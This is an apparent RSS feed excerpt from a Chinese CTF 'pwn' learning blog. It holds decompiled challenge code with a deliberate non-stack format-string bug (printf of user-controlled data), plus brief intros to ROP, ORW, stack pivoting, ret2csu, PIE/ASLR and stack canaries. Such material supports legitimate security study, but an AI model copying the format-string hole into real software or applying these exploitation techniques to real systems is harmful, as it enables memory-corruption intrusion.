&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;-al&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nf">fork&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">execve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/ls&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">wait&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;good luck :-)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">v2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nf">__readfsqword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x28u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">__int64&lt;/span> &lt;span class="nf">sub_2B0F&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;input file name you want to read:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">__isoc99_scanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nf">strstr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;flag&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;flag is not allowed!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="kr">__fastcall&lt;/span> &lt;span class="nf">start_routine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">a1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">v1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+4h] [rbp-46Ch]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">j&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+8h] [rbp-468h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+Ch] [rbp-464h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">_BYTE&lt;/span> &lt;span class="n">v6&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">96&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+10h] [rbp-460h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">_BYTE&lt;/span> &lt;span class="n">v7&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+70h] [rbp-400h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">_BYTE&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+80h] [rbp-3F0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v9&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+468h] [rbp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v9&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">__readfsqword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x28u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_1329&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v6&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_1379&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v6&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">sub_14CB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v6&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v7&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;I will tell you last file name content in md5:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%02X&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">v7&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">putchar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">999&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">j&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">fd&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3E8u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">byte_50A0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34; ,your file read done!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;file not found!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">v9&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nf">__readfsqword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x28u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>程序只有这一个非栈上格式化字符串漏洞&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 异架构 Arm</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/</link><pubDate>Sat, 19 Jul 2025 13:26:25 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/</guid><description>&lt;h2 id="arm-汇编速探">Arm 汇编速探
&lt;a class="header-anchor" href="#arm-%e6%b1%87%e7%bc%96%e9%80%9f%e6%8e%a2">&lt;/a>
&lt;/h2>&lt;h3 id="函数调用约定">函数调用约定
&lt;a class="header-anchor" href="#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a">&lt;/a>
&lt;/h3>&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> TODO: 写一片文章介绍 arm 汇编相关知识&lt;/li>
&lt;/ul>
&lt;h4 id="arm32aarch32调用约定">ARM32（AArch32）调用约定
&lt;a class="header-anchor" href="#arm32aarch32%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a">&lt;/a>
&lt;/h4>&lt;ul>
&lt;li>
&lt;p>前 4 个参数：&lt;code>r0 ~ r3&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>返回值：&lt;code>r0&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>多余参数：栈上传递，&lt;strong>从右往左&lt;/strong>入栈&lt;/p>
&lt;/li>
&lt;li>
&lt;p>堆栈平衡：&lt;strong>被调用函数&lt;/strong>负责&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数调用：&lt;code>bl&lt;/code>/&lt;code>b&lt;/code>，返回用 &lt;code>bx lr&lt;/code> 或 &lt;code>mov pc, lr&lt;/code>&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - ORW</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---orw/</link><pubDate>Sat, 19 Jul 2025 10:49:56 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---orw/</guid><description>&lt;h2 id="orw-初识">ORW 初识
&lt;a class="header-anchor" href="#orw-%e5%88%9d%e8%af%86">&lt;/a>
&lt;/h2>&lt;p>ORW类题目是指程序开了沙箱保护，禁用了一些函数的调用（如 execve等），使得我们并不能正常 get shell，只能通过ROP的方式调用open, read, write的来读取并打印flag 内容&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 栈迁移</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E8%BF%81%E7%A7%BB/</link><pubDate>Sun, 13 Jul 2025 12:55:08 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E8%BF%81%E7%A7%BB/</guid><description>&lt;h2 id="栈迁移初识">栈迁移初识
&lt;a class="header-anchor" href="#%e6%a0%88%e8%bf%81%e7%a7%bb%e5%88%9d%e8%af%86">&lt;/a>
&lt;/h2>&lt;ul>
&lt;li>当我们栈溢出可用字节较少, 可以考虑进行栈迁移&lt;/li>
&lt;li>程序开启了 PIE 保护机制，栈地址未知，我们可以将栈劫持到已知的地址&lt;/li>
&lt;li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用&lt;/li>
&lt;/ul>
&lt;p>让我们来深入了解 &lt;code>leave&lt;/code> 和 &lt;code>ret&lt;/code> 指令&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2csu</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/</link><pubDate>Sat, 12 Jul 2025 10:51:54 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>正常程序中是不可能有许多可利用的 gadget的，通常只有一个或几个 gadget 可以利用
ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个 gadget&lt;/p>
&lt;h2 id="程序解读">程序解读
&lt;a class="header-anchor" href="#%e7%a8%8b%e5%ba%8f%e8%a7%a3%e8%af%bb">&lt;/a>
&lt;/h2>&lt;p>
&lt;a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5" title="蒸米的一步一步学 ROP level5" rel="noopener external nofollow noreferrer" target="_blank" class=" exturl">
 蒸米的一步一步学 ROP level5
 
 &lt;i class="fa fa-external-link-alt">&lt;/i>
 
&lt;/a>&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 格式化字符串</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</link><pubDate>Sat, 12 Jul 2025 10:51:35 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</guid><description>&lt;h2 id="格式化字符串初识">格式化字符串初识
&lt;a class="header-anchor" href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e5%88%9d%e8%af%86">&lt;/a>
&lt;/h2>&lt;p>&lt;img src="/imgs/img-lazy-loading.gif" data-src="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/figure/printf.png" alt="示意图" />&lt;/p>
&lt;p>常见的格式化字符串函数有 &lt;code>printf&lt;/code>、&lt;code>sprintf&lt;/code>、&lt;code>fprintf&lt;/code>、&lt;code>vprintf&lt;/code>、&lt;code>vfprintf&lt;/code> 等。&lt;/p>
&lt;p>让我们写个简单的程序来观察观察：&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - PIE 和 ALSR</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pie-%E5%92%8C-alsr/</link><pubDate>Fri, 11 Jul 2025 22:15:52 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pie-%E5%92%8C-alsr/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;ul>
&lt;li>PIE（Position Independent Executable）和ASLR（Address Space Layout Randomization）是现代操作系统中常用的安全机制。通过随机化程序的内存布局，PIE和ASLR可以有效地防止攻击者利用已知的内存地址进行攻击。&lt;/li>
&lt;/ul>
&lt;p>ALSR 安全保护等级可以使用如下命令查看:&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Cancary</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---cancary/</link><pubDate>Wed, 02 Jul 2025 21:17:51 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---cancary/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>Cancary 是一种安全加固保护机制，通过对程序栈底插入一段随机的字节串，来校验当前程序是否被栈溢出&lt;/p>
&lt;h2 id="cancary">cancary
&lt;a class="header-anchor" href="#cancary">&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-10">&lt;a class="lnlinks" href="#hl-0-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-11">&lt;a class="lnlinks" href="#hl-0-11">11&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-12">&lt;a class="lnlinks" href="#hl-0-12">12&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-13">&lt;a class="lnlinks" href="#hl-0-13">13&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-14">&lt;a class="lnlinks" href="#hl-0-14">14&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-15">&lt;a class="lnlinks" href="#hl-0-15">15&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-16">&lt;a class="lnlinks" href="#hl-0-16">16&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-17">&lt;a class="lnlinks" href="#hl-0-17">17&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-18">&lt;a class="lnlinks" href="#hl-0-18">18&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-19">&lt;a class="lnlinks" href="#hl-0-19">19&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-20">&lt;a class="lnlinks" href="#hl-0-20">20&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-21">&lt;a class="lnlinks" href="#hl-0-21">21&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-22">&lt;a class="lnlinks" href="#hl-0-22">22&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// main.c
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">canary_strong&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">MyStruct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x4&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="n">MyStruct&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MyStruct&lt;/span> &lt;span class="n">myStruct&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">canary&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

